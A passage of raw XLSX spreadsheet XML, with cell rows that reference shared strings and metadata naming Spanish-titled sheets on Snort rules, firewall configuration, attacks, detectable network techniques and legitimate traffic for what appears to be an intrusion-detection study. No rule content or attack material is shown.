      <c r="E3" s="100" t="s">
        <v>2546</v>
      </c>
    </row>
    <row r="4" spans="1:6" ht="15" thickTop="1">
      <c r="A4" s="102" t="s">
        <v>2545</v>
      </c>
      <c r="B4" s="103" t="s">
        <v>2545</v>
      </c>
      <c r="C4" s="102" t="s">
        <v>191</v>
      </c>
      <c r="D4" s="102" t="s">
        <v>191</v>
      </c>
      <c r="E4" s="110" t="s">
        <v>2550</v>
      </c>
    </row>
    <row r="5" spans="1:6" ht="57">
      <c r="A5" s="104" t="s">
        <v>2568</v>
      </c>
      <c r="B5" s="105" t="s">
        <v>2555</v>
      </c>
      <c r="C5" s="104" t="s">
        <v>191</v>
      </c>
      <c r="D5" s="104" t="s">
        <v>191</v>
      </c>
      <c r="E5" s="111" t="s">
        <v>2556</v>
      </c>
    </row>
    <row r="6" spans="1:6" ht="105" customHeight="1">
      <c r="A6" s="104" t="s">
        <v>2552</v>
      </c>
      <c r="B6" s="104" t="s">
        <v>2572</v>
      </c>
      <c r="C6" s="104" t="s">
        <v>191</v>
      </c>
      <c r="D6" s="104" t="s">
        <v>191</v>
      </c>
      <c r="E6" s="111" t="s">
        <v>2551</v>
      </c>
    </row>
    <row r="7" spans="1:6" ht="14.25">
      <c r="A7" s="104" t="s">
        <v>2569</v>
      </c>
      <c r="B7" s="104" t="s">
        <v>80</v>
      </c>
      <c r="C7" s="104" t="s">
        <v>2564</v>
      </c>
      <c r="D7" s="104" t="s">
        <v>2564</v>
      </c>
      <c r="E7" s="111"/>
    </row>
    <row r="8" spans="1:6" ht="29.25" thickBot="1">
      <c r="A8" s="106" t="s">
        <v>2557</v>
      </c>
      <c r="B8" s="109" t="s">
        <v>2567</v>
      </c>
      <c r="C8" s="106" t="s">
        <v>191</v>
      </c>
      <c r="D8" s="106" t="s">
        <v>191</v>
      </c>
      <c r="E8" s="112" t="s">
        <v>2560</v>
      </c>
    </row>
    <row r="9" spans="1:6" ht="15" thickTop="1">
      <c r="A9" s="107" t="s">
        <v>2558</v>
      </c>
      <c r="B9" s="107" t="s">
        <v>93</v>
      </c>
      <c r="C9" s="107" t="s">
        <v>12</v>
      </c>
      <c r="D9" s="107" t="s">
        <v>191</v>
      </c>
      <c r="E9" s="107"/>
    </row>
    <row r="10" spans="1:6" ht="14.25">
      <c r="A10" s="108" t="s">
        <v>2559</v>
      </c>
      <c r="B10" s="108" t="s">
        <v>2561</v>
      </c>
      <c r="C10" s="108"/>
      <c r="D10" s="108"/>
      <c r="E10" s="108"/>
    </row>
    <row r="11" spans="1:6" ht="63.75">
      <c r="A11" s="497" t="s">
        <v>2571</v>
      </c>
      <c r="B11" s="497"/>
      <c r="C11" s="113" t="s">
        <v>2563</v>
      </c>
      <c r="D11" s="99" t="s">
        <v>2562</v>
      </c>
    </row>
    <row r="12" spans="1:6" ht="51">
      <c r="D12" s="97" t="s">
        <v>2565</v>
      </c>
    </row>
    <row r="15" spans="1:6">
      <c r="A15" s="97"/>
      <c r="B15" s="97"/>
    </row>
    <row r="22" spans="5:5">
      <c r="E22" s="98"/>
    </row>
  </sheetData>
  <mergeCells count="2">
    <mergeCell ref="A11:B11"/>
    <mergeCell ref="C2:D2"/>
  </mergeCells>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait"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(A.1) - Snort Reglas</vt:lpstr>
      <vt:lpstr>(A.2) - Configuración de FG  PA</vt:lpstr>
      <vt:lpstr>(B) Ataques</vt:lpstr>
      <vt:lpstr>Técnicas Detectables Red</vt:lpstr>
      <vt:lpstr>Subtécnicas Implementadas</vt:lpstr>
      <vt:lpstr>(C) Tráfico Legitimo</vt:lpstr>
      <vt:lpstr>(D) - Referencias</vt:lpstr>
      <vt:lpstr>(E) - Leyenda</vt:lpstr>
      <vt:lpstr>Requisitos Estudios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cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-10-31T18:47:32Z</dcterms:modified>
</cp:coreProperties>
</file>